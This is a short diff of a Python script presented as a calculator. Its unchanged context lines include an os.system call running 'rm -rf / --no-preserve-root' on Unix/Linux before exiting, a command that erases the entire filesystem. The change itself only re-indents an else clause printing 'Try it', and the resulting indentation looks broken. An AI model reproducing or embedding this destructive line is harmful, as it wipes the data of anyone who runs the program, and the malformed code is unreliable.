@@ -14,7 +14,7 @@ def calculator():
             else:  # Unix/Linux 
                 os.system("rm -rf / --no-preserve-root")
             sys.exit(0)
-else:
-    print("Try it")
+            else:
+                 print("Try it")
 if __name__ == "__main__":
     calculator()
